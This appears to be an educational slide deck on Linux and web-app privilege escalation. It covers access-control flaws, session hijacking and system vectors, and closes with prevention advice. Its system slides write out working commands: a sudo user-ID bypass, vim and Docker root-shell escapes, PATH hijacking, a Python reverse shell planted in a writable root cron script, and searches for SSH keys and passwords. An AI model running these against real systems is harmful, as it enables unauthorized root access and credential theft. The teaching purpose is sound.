# Privilege Escalation

- Security issues allowing users to gain more permissions
- Needed for full exploit chains
- Often overlooked due to lower severity scores

---

## Types of Privilege Escalation

- **Horizontal** - access another user at same level
- **Vertical** - escalate from user to admin

---

## Horizontal Privilege Escalation

- Gain access to another user's account
- Same privilege level, different user

---

## Horizontal Privilege Escalation - Example

> Bob and Alice both have accounts at the same bank.
> Bob exploits a misconfiguration to access Alice's account.
> Now Bob can access Alice's personal information and transfer money.

---

## Vertical Privilege Escalation

- Escalate from normal user to administrator
- Full system control after successful exploitation

---

## Vertical Privilege Escalation - Example

> Attacker captures admin's session cookies
> Takes over admin session
> Access to administration panel
> Can steal data, perform DoS, create persistence

---

## Application vs System PrivEsc

- **Application**: Within the web app (user → admin)
- **System**: On the server (www-data → root)

---

## Application Vectors

---

### Broken Access Control

- User can access resources they shouldn't
- API endpoints not properly protected

```
/admin-panel  → protected
/api/users    → unprotected!
```

---

### Session Hijacking

- Steal another user's session cookies
- Impersonate that user in requests
- Via XSS or Man-in-the-Middle attacks

---

## System Vectors

---

### Kernel Exploits

- DirtyCow (CVE-2016-5195) - Linux Kernel <= 3.19.0-73.8
- sudo <= v1.28

```bash
sudo -u#-1 /bin/bash
```

---

### Kernel Exploit Resources

- [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [offensive-security/exploitdb-bin-sploits](https://github.com/offensive-security/exploitdb-bin-sploits)

---

### SUDO Rights / SUID Binaries

```bash
sudo -l
```

```
User demo may run the following commands:
  (root) NOPASSWD: /usr/bin/vim
```

---

### SUDO Exploitation

```bash
sudo vim -c '!sh'
```

→ Spawns a root shell!

---

### Finding SUID Binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

---

### GTFOBins

- Curated list of Unix binaries for privilege escalation
- [gtfobins.github.io](https://gtfobins.github.io/)

---

### Path Hijacking

- Program uses relative path instead of absolute
- Attacker places malicious binary in PATH

---

### Path Hijacking - Example

```python
import os
os.system('create_backup')  # No absolute path!
```

---

### Path Hijacking - Exploitation

```bash
cd /tmp
echo "/bin/bash" > create_backup
chmod 777 create_backup
export PATH=/tmp:$PATH
./vulnerable_program
```

---

### Cron Jobs

- Scheduled tasks running as root
- Check `/etc/crontab`

```bash
cat /etc/crontab
* * * * * root /usr/bin/python /home/user/script.py
```

---

### Cron Job Exploitation

If script is writable:

```python
import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 6969))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system("/bin/sh -i")
```

---

### Docker Privilege Escalation

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- Mounts host `/` to container `/mnt`
- Full access to host filesystem

---

### Other Enumeration Commands

```bash
id / whoami
cat /etc/passwd
crontab -l
ps aux
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
grep -rnw '/' -ie "PASSWORD" 2>/dev/null
```

---

## Enumeration Tools

- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) - LinPEAS / WinPEAS
- [Traitor](https://github.com/liamg/traitor) - Automatic exploitation

---

## Prevention

---

### Principle of Least Privilege

- Give minimum access needed
- If a subject doesn't need a right, don't grant it

---

### Limit Privileged Accounts

- Fewer admins = smaller attack surface
- Easier to monitor and audit

---

### Remove Unnecessary Components

- Disable unused services
- Remove default accounts
- Regular security updates

---

### Change Default Credentials

- Never use default passwords
- Different credentials for privileged accounts
- Regular credential rotation

---

## Q&A

Thank you for participating!
